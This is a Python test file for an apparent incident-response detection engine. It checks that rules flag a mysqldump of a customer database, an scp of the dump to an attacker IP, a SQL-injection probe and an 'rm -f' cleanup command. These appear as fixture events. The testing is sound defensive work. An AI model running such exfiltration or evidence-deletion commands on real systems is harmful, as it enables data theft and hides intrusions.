import uuid
from pathlib import Path

from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.main import app as fastapi_app
from app.core.dependencies import get_current_user
from app.core.security import hash_password
from app.db.base import Base
import app.db.models  # noqa: F401
from app.db.models.case import Case, CaseStatus
from app.db.models.user import User, UserRole
from app.db.session import get_db
from app.api.v1 import evidence as evidence_module
from app.parsers.registry import get_parser
from app.services.detection_engine import execute_detections_on_events
from app.services.normalizer import normalize_records


WEB_COMPROMISE_DIR = (
    Path(__file__).resolve().parents[1] / "test_evidence" / "web_server_compromise"
)


def test_combined_dump_scp_netflow_critical_standalone_high_and_rm_finding():
    # Standalone dump without external transfer must NOT trigger rule-mysqldump-scp-exfil
    dump_only = [{
        "id": "d-1",
        "timestamp": "2026-07-22T02:15:20Z",
        "event_type": "auditd",
        "details": {"host": "WEB-01", "user": "root", "command_line": "mysqldump -u root shopdb customers"},
    }]
    assert [f for f in execute_detections_on_events(dump_only, uuid.uuid4()) if f["rule_id"] == "rule-mysqldump-scp-exfil"] == []

    # Standalone scp to a flagged attacker IP (from prior SQLi/web event) escalates from medium to high
    scp_to_attacker = [
        {
            "id": "att-1",
            "timestamp": "2026-07-22T01:25:07Z",
            "event_type": "web_access",
            "details": {"host": "WEB-01", "src_ip": "203.0.113.140", "raw": "GET /product.php?id=1' HTTP/1.1"},
        },
        {
            "id": "scp-1",
            "timestamp": "2026-07-22T02:16:50Z",
            "event_type": "auditd",
            "details": {"host": "WEB-01", "user": "root", "command_line": "scp /tmp/c.sql sysupdate@203.0.113.140:/home/sysupdate/"},
        },
    ]
    scp_findings = [f for f in execute_detections_on_events(scp_to_attacker, uuid.uuid4()) if f["rule_id"] == "rule-scp-transfer"]
    assert len(scp_findings) == 1
    assert scp_findings[0]["severity"] == "high"

    # Full sample case: combined critical exfil (3 events) + rm -f /tmp/c.sql (T1070.004)
    events = []
    for fname in ("01_apache_access.log", "02_auth.log", "03_auditd.log", "07_netflow_export.csv"):
        fpath = WEB_COMPROMISE_DIR / fname
        assert fpath.is_file()
        records = get_parser(fpath, original_filename=fname).parse(fpath, original_filename=fname)
        for rec in normalize_records(records, default_filename=fname):
            rec["id"] = str(uuid.uuid4())
            events.append(rec)

    findings = execute_detections_on_events(events, uuid.uuid4())
    by_id = {e["id"]: e for e in events}

    exfil_findings = [f for f in findings if f.get("mitre_technique") == "T1048"]
    assert len(exfil_findings) == 1, f"Expected single combined T1048 exfil finding, got {exfil_findings}"
    exfil = exfil_findings[0]
    assert exfil["rule_id"] == "rule-mysqldump-scp-exfil"
    assert exfil["severity"] == "critical"
    assert len(exfil["matching_event_ids"]) == 3

    matched_types = {by_id[eid]["event_type"] for eid in exfil["matching_event_ids"]}
    assert matched_types == {"auditd", "network_connection"}
    matched_cmds = [by_id[eid]["details"].get("command_line") or "" for eid in exfil["matching_event_ids"]]
    assert any("mysqldump" in c for c in matched_cmds)
    assert any("scp " in c for c in matched_cmds)
    flow_ev = next(by_id[eid] for eid in exfil["matching_event_ids"] if by_id[eid]["event_type"] == "network_connection")
    assert flow_ev["details"]["dst_ip"] == "203.0.113.140"
    assert int(flow_ev["details"]["bytes_out"]) == 39500000

    rm_findings = [f for f in findings if f.get("mitre_technique") == "T1070.004"]
    assert len(rm_findings) == 1
    assert rm_findings[0]["severity"] in {"low", "medium"}
    assert rm_findings[0]["mitre_tactic"] == "Defense Evasion"
    assert any("rm -f /tmp/c.sql" in (by_id[eid]["details"].get("command_line") or "") for eid in rm_findings[0]["matching_event_ids"])


def test_sample_case_api_exfil_and_rm_findings(tmp_path, monkeypatch):
    test_db = tmp_path / "exfil_cleanup.sqlite"
    engine = create_engine(f"sqlite:///{test_db}", connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=engine)
    TestSession = sessionmaker(bind=engine, autoflush=False, autocommit=False)
    upload_dir = tmp_path / "evidence_uploads"
    upload_dir.mkdir(parents=True, exist_ok=True)
    monkeypatch.setattr(evidence_module, "UPLOAD_DIR", upload_dir)

    db = TestSession()
    user = User(
        username=f"inv_{uuid.uuid4().hex[:8]}",
        email=f"inv_{uuid.uuid4().hex[:8]}@dcsre.test",
        hashed_password=hash_password("Investigator#2026"),
        role=UserRole.INVESTIGATOR,
        is_active=True,
    )
    db.add(user)
    db.flush()
    case = Case(name="Exfil & Cleanup", description="Sample case", status=CaseStatus.OPEN, created_by=user.id)
    db.add(case)
    db.commit()

    def override_get_db():
        session = TestSession()
        try:
            yield session
        finally:
            session.close()

    prev_db = fastapi_app.dependency_overrides.get(get_db)
    prev_user = fastapi_app.dependency_overrides.get(get_current_user)
    fastapi_app.dependency_overrides[get_db] = override_get_db
    fastapi_app.dependency_overrides[get_current_user] = lambda: user
    try:
        client = TestClient(fastapi_app)
        for fname in ("01_apache_access.log", "02_auth.log", "03_auditd.log", "07_netflow_export.csv"):
            fpath = WEB_COMPROMISE_DIR / fname
            with fpath.open("rb") as fh:
                res = client.post(
                    f"/api/v1/evidence/cases/{case.id}/evidence/upload",
                    files={"file": (fname, fh, "text/plain")},
                    data={"description": fname},
                )
                assert res.status_code == 201, res.text

        detections = client.get(f"/api/v1/detections/cases/{case.id}/detections").json()
        exfil = [d for d in detections if d.get("mitre_technique") == "T1048"]
        assert len(exfil) == 1
        assert exfil[0]["severity"] == "critical"
        assert len(exfil[0]["matched_event_ids"]) == 3
        assert "WEB-01" in (exfil[0].get("hosts") or [])

        rm_det = [d for d in detections if d.get("mitre_technique") == "T1070.004"]
        assert len(rm_det) == 1
        assert rm_det[0]["mitre_tactic"] == "Defense Evasion"
    finally:
        if prev_db is not None:
            fastapi_app.dependency_overrides[get_db] = prev_db
        else:
            fastapi_app.dependency_overrides.pop(get_db, None)
        if prev_user is not None:
            fastapi_app.dependency_overrides[get_current_user] = prev_user
        else:
            fastapi_app.dependency_overrides.pop(get_current_user, None)
        db.close()
        engine.dispose()
